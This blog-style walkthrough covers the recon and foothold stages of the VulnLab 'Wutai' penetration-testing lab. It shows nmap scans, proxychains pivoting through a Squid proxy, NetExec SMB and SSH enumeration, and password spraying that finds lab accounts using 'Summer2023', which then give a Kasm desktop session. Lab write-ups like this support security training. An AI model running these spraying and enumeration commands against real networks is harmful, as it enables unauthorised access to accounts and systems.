---
title : "VulnLab - Wutai Writeup"
date: 2023-11-02 07:23:00 +0530
categories: [Red Team Lab]
tags: [Wutai]
---

![image](/assets/post_img/wutai.png)

# <span style="color:lightblue">Lab Intro</span>

**The Wutai Group has tasked you with performing a penetration test on its networks. This includes the Wutai Parent Company & its subsidiary Junon. Wutai is concerned about its security posture since a leak of domain usernames was found online on pastebin.**

---

https://pastebin.com/BBZkJGU1

KE37vTed5S

**The goal of this test is to reach Enterprise Administrator in the wutai.vl domain. Wutai employs a small SOC but its blue team capabilities are still on a rather basic level.
Wutai's external systems can be reached through the RTL VPN on the 172.16.20.0/24 network. Everything is in scope except the infrastructure (172.16.xx.1/172.16.xx.2). To access the network add the following line to your ovpn file:
Completing the lab awards a badge.**

---

```
Wutai集团委托您对其网络进行渗透测试
其中包括Wutai母公司及其子公司Junon
自从在 Pastebin 上发现域名用户名泄露后,Wutai对其安全状况感到担忧

此测试的目标是访问 wutai.vl 域中的企业管理员 Enterprise Administrator
Wutai 采用小型 SOC，但其蓝队能力仍处于相当基础的水平

Wutai的外部系统可以通过172.16.20.0/24网络上的VPN到达
除基础设施 (172.16.xx.1/172.16.xx.2) 外,所有内容均在范围内

完成实验室将授予徽章
```

---

## <span style="color:lightgreen">Hints & Comments</span>

- There is an outbound proxy server - if you can't connect back check if your payload is proxy-aware
- Check for common mistakes that *people* make, weak passwords, password reuse across different accounts 
- Assume there is user activity in the lab so backdooring things can make sense


```
提示:

outbound proxy server
weak passwords 
实验室中有其他用户 activity
```

---

# <span style="color:lightblue">Recon</span>
## <span style="color:lightgreen">pastebin</span>

```
https://pastebin.com/BBZkJGU1

KE37vTed5S
```

```
Katie.Shaw@work.junon.vl
Marion.Green@work.junon.vl
...
```

```bash
cat users.txt|wc
    300     301    8615


cut -d '@' -f 1 users.txt > users1.txt
cat users1.txt| sed 's/^ *//g' > usernames.txt
rm -rf users.txt users1.txt
tail usernames.txt
Adam.Henderson
Elliot.Brown
Clive.Ellis
Chloe.Hill
Paul.Smith
Malcolm.Brown
Clifford.Bradley
Daniel.Yates
Emily.Conway
Damien.Howell
```
---

## <span style="color:lightgreen">Recon</span>

```bash
nmap -sC -sV -T4 -Pn 172.16.20.3-254 -n -vv -A --min-parallelism=50 --max-parallelism=150 --min-rate 5000 > nmap_tcp_scan.conf

map scan report for 172.16.20.50
Host is up, received user-set (0.35s latency).
Scanned at 2023-11-02 22:20:20 EDT for 382s
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE    REASON  VERSION
22/tcp   open  ssh        syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c7:cd:1e:d9:39:fb:be:6d:c4:f4:ba:ab:58:92:17:e9 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPXNwoJYzOzz0K2JR4AtPFa3RMCctqlV7bX/0r7S4+kLU1ZxrqpGq8rFsciMBgiXrFUPcMmbQDBgWl/c2dp2L5Q=
|   256 5c:e8:e2:b1:00:f7:a2:b0:fa:15:47:98:6c:b9:4e:47 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICm80WNVgRnaq/3iDVR7hpPOZmTgfCKNehGpSzteXXDz
8080/tcp open  http-proxy syn-ack Squid http proxy 5.2
|_http-title: ERROR: The requested URL could not be retrieved
|_http-server-header: squid/5.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

map scan report for 172.16.20.100
Host is up, received user-set (0.35s latency).
Scanned at 2023-11-02 22:26:42 EDT for 371s
Not shown: 998 closed tcp ports (conn-refused)
PORT    STATE SERVICE  REASON  VERSION
22/tcp  open  ssh      syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 9a:a5:ac:e6:b0:46:8d:d2:24:f7:33:c3:ec:9f:14:bb (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBL3QYz4aZ2JkAZGNJeNy94LKyMYM+ic7soYWQeQ6+VGX8ITvWVWtNBonRMl8xfm6wOuYBC+eU9y/nzfgHXWNX9U=
|   256 d8:74:a8:05:04:19:6d:d8:74:f9:30:9d:ae:05:f4:df (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIK/qP6CibCG23Cy7+ivlRe2oQXfum2HKGjZKI4uaZeaQ
443/tcp open  ssl/http syn-ack nginx
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
| ssl-cert: Subject: commonName=wutai-vdi-gw/organizationName=None/stateOrProvinceName=VA/countryName=US/localityName=None/organizationalUnitName=DoFu/emailAddress=none@none.none
| Issuer: commonName=wutai-vdi-gw/organizationName=None/stateOrProvinceName=VA/countryName=US/localityName=None/organizationalUnitName=DoFu/emailAddress=none@none.none
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-03-10T15:01:48
| Not valid after:  2028-03-08T15:01:48
| MD5:   cb41:82f3:03f9:4d5d:1a7e:1727:dc81:cac1
| SHA-1: 21f2:33b0:0846:f2d1:5853:c5c4:4366:de94:3774:a7f1
| -----BEGIN CERTIFICATE-----
| MIID2zCCAsOgAwIBAgIUHtMlP/D54ypWpXaokL6gz4VFmWkwDQYJKoZIhvcNAQEL
| BQAwfTELMAkGA1UEBhMCVVMxCzAJBgNVBAgMAlZBMQ0wCwYDVQQHDAROb25lMQ0w
| CwYDVQQKDAROb25lMQ0wCwYDVQQLDAREb0Z1MRUwEwYDVQQDDAx3dXRhaS12ZGkt
| Z3cxHTAbBgkqhkiG9w0BCQEWDm5vbmVAbm9uZS5ub25lMB4XDTIzMDMxMDE1MDE0
| OFoXDTI4MDMwODE1MDE0OFowfTELMAkGA1UEBhMCVVMxCzAJBgNVBAgMAlZBMQ0w
| CwYDVQQHDAROb25lMQ0wCwYDVQQKDAROb25lMQ0wCwYDVQQLDAREb0Z1MRUwEwYD
| VQQDDAx3dXRhaS12ZGktZ3cxHTAbBgkqhkiG9w0BCQEWDm5vbmVAbm9uZS5ub25l
| MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA5lSZMXTDldBRJE51sxB/
| uR9cVmh4/aIj4IH44zcymAPvrNeBWs4nySaVx9jxul6OfyTcNOM3/AWi/d/DA+nx
| mTn+H35mWV6QX81356gCbbJrVmP2tQC6q9dfn0l7D2E64PCH4MO/PA25TmEs6rGi
| P57AvGgrltg4wUJGbJJP8EMoZTxagsV+J6txDqAcYmhk17OSlzQLSMN4cwRUTzYD
| dRchmQR4PtcaZU+ybiwiELs+/xX0vlBrNwTCkUilqDa23NNmu3SzjEVHmNKa5WlJ
| cWg/rRSFJ8TogZsCmCHhLX08gckqSpjF4SehbPRmNOSEo+hufSUtbNsXFldVkHBG
| pwIDAQABo1MwUTAdBgNVHQ4EFgQUd1ly81+hDgaR+PLyIIAL5gzLfk4wHwYDVR0j
| BBgwFoAUd1ly81+hDgaR+PLyIIAL5gzLfk4wDwYDVR0TAQH/BAUwAwEB/zANBgkq
| hkiG9w0BAQsFAAOCAQEAAfoVKBVRgBjwWcCCKFXS23UXjNNRpDQG1mTRmuXJlvsD
| guJwk+ThWcEidRmdu+VEtMrXq0QoB2yP5QG60wFH1aUZ/Yi02s4h8rjkC+Bt4hpV
| pZj5MPbZFzCi0a7a4TtybluV3g2Kzs2xv8vNRZXYGqJyGcz1sCF6luXzUURASInl
| unGi4GK3jw1tuI29hpE3ElGM0zh8mVdHVIiOTtTB1Dj0ePbtCrIesixW7hHicUup
| mzNV27bmQVXc7MuaC65PF0qQ1ceCdQeWcFFfwfD3CCn5n2UXWQdQybOLzPhBMhlw
| vGM8WlHgcmo6M/7QTXP9uHTKH4/CnZGsjQ6iHPLduA==
|_-----END CERTIFICATE-----
|_http-title: Site doesn't have a title (text/html).
|_ssl-date: TLS randomness does not represent time
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

---

### <span style="color:lightgreen">172.16.20.50 - TCP 8080</span>

```
http-proxy syn-ack Squid http proxy 5.2

Squid HTTP Proxy 是一种非常流行的开源代理服务器软件，用于提供缓存和代理功能，主要用于加速和优化 Web 请求
Squid 允许客户端计算机通过代理服务器访问 Internet
```

```bash
/etc/proxychains4.conf
http 172.16.20.50 8080
```

---

### <span style="color:lightgreen">172.16.20.100 - TCP 443</span>

![](/assets/post_img/Kasm_Workspaces.png)

```
https://kasmweb.com/

Kasm Workspaces 是一个虚拟桌面和远程办公解决方案，用于提供安全的、可扩展的云端工作环境

但是目前没有相关凭据
```

---

### <span style="color:lightgreen">通过Squid http proxy 探测内网可达网段</span>

```bash
/etc/proxychains4.conf
http 172.16.20.50 8080
```

#### <span style="color:lightgreen">Map Network Hosts</span>
```
https://github.com/Pennyw0rth/NetExec
https://www.netexec.wiki/
```

```bash
proxychains4 -q ./nxc smb 172.16.20.0/23
SMB         172.16.21.180   445    S021M010         [*] Windows 10.0 Build 20348 x64 (name:S021M010) (domain:work.junon.vl) (signing:False) (SMBv1:False)
SMB         172.16.21.195   445    S021M015         [*] Windows 10.0 Build 20348 x64 (name:S021M015) (domain:work.junon.vl) (signing:False) (SMBv1:False)
SMB         172.16.21.200   445    S021M005         [*] Windows 10.0 Build 20348 x64 (name:S021M005) (domain:work.junon.vl) (signing:True) (SMBv1:False)
SMB         172.16.21.222   445    S021M200         [*] Windows 10.0 Build 20348 x64 (name:S021M200) (domain:eu.junon.vl) (signing:True) (SMBv1:False)
```
172.16.21.0/24
---

```
proxychains4 -q nmap -sT -p 22,80,88,443,445,3389,5985 172.16.21.3-254 -oA 21.txt


172.16.21.180
172.16.21.195
172.16.21.200
172.16.21.222
172.16.21.240

https://172.16.21.120/ui/
172.16.21.120 https://172.16.21.120/ui/ ESXI
http://172.16.21.180/  iis
http://172.16.21.195/
http://172.16.21.200/
http://172.16.21.222/certsrv ADCS

172.16.21.240 https://s021v010.work.junon.vl/ Bitwarden Web Vault
```

#### <span style="color:lightgreen">SSH protocol</span>

```bash
proxychains4 -q ./nxc ssh 172.16.21.3-254

SSH         172.16.21.3     22     172.16.21.3      [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1
SSH         172.16.21.50    22     172.16.21.50     [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1
SSH         172.16.21.100   22     172.16.21.100    [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1
SSH         172.16.21.240   22     172.16.21.240    [*] SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5
```

#### <span style="color:lightgreen">Enumerate Null Sessions</span>

```bash
proxychains4 -q ./nxc smb 172.16.21.3-254 -u '' -p '' --shares
```

#### <span style="color:lightgreen">ASREPRoast</span>

```
proxychains4 -q crackmapexec ldap 172.16.21.200 -u usernames.txt -p '' --asreproast asrep.txt

nothing
```
#### <span style="color:lightgreen">Password Spraying</span>

```
proxychains4 -q ./nxc smb 172.16.21.200 -u usernames.txt -p Summer2023 --continue-on-success > brute.txt


Wutai2023
Junon2023

cat Desktop/brute.txt|grep +

SMB         172.16.21.200   445    S021M005         [+] work.junon.vl\Wendy.Vincent:Summer2023
SMB         172.16.21.200   445    S021M005         [+] work.junon.vl\Melanie.Mueller:Summer2023
SMB         172.16.21.200   445    S021M005         [+] work.junon.vl\Terry.Lowe:Summer2023
SMB         172.16.21.200   445    S021M005         [+] work.junon.vl\Hazel.Simpson:Summer2023
```

---

#### <span style="color:lightgreen">kerbrute</span>

```
proxychains4 -q /usr/share/doc/python3-impacket/examples/GetNPUsers.py work.junon.vl/ -no-pass -usersfile usernames.txt


```

---

# <span style="color:lightblue">Foothold</span>
## <span style="color:lightgreen">Kasm Workspaces</span>

```
Terry.Lowe@work.junon.vl
Summer2023
```

![](/assets/post_img/Wutai_Foothold.png)

```powershell
C:\Users\Hazel.Simpson>whoami
work-junon\hazel.simpson

C:\Users\Hazel.Simpson>hostname
S021M010
```

---

